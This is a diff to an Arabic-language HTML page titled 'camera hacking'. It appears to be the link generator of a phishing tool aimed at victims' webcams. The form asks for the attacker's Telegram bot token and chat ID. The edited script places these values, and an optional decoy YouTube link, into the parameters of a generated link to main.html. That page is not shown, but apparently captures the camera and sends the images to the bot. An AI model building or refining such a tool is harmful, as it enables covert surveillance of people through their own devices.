@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>إعداد التطبيق</title>
+  <title>اختراق الكامرا</title>
   <style>
     body {
       margin: 0;
@@ -129,13 +129,13 @@
     </div>
   </div>
   <div id="form-container" class="container hidden">
-    <h1>إعداد التطبيق</h1>
+    <h1>اختراق الكاميرا</h1>
     <form id="info-form" onsubmit="generateLink(event)">
       <label for="token">أدخل التوكن:</label>
       <input type="password" id="token" placeholder="توكن البوت" required />
-      <label for="chat-id">أدخل معرف الشات:</label>
+      <label for="chat-id">أدخل ID:</label>
       <input type="password" id="chat-id" placeholder="معرف الشات" required />
-      <label for="custom-link">ضع رابطك الخاص (اختياري):</label>
+      <label for="custom-link">ضع رابطك يوتيوب او اي شي (اختياري):</label>
       <input type="text" id="custom-link" placeholder="رابط يوتيوب أو أي رابط آخر" />
       <button type="submit">إنشاء الرابط</button>
     </form>
@@ -143,12 +143,10 @@
   </div>
   <footer>
     <div class="telegram">
-      <a href="https://t.me/+4WnxlFYJlE80ZTEy" target="_blank">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram" />
-        انضم إلى قناتي
+
       </a>
     </div>
-    © 2024 - إعداد تطبيق الكاميرا
+
   </footer>
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
@@ -191,11 +189,9 @@
       const token = document.getElementById("token").value;
       const chatId = document.getElementById("chat-id").value;
       const customLink = document.getElementById("custom-link").value;
-      localStorage.setItem("token", token);
-      localStorage.setItem("chatId", chatId);
-      let link = "main.html";
+      let link = `main.html?token=${encodeURIComponent(token)}&chat_id=${encodeURIComponent(chatId)}`;
       if(customLink.trim() !== ""){
-        link += `?url=${encodeURIComponent(customLink)}`;
+        link += `&url=${encodeURIComponent(customLink)}`;
       }
       localStorage.setItem("generatedLink", link);
       showLink(link);
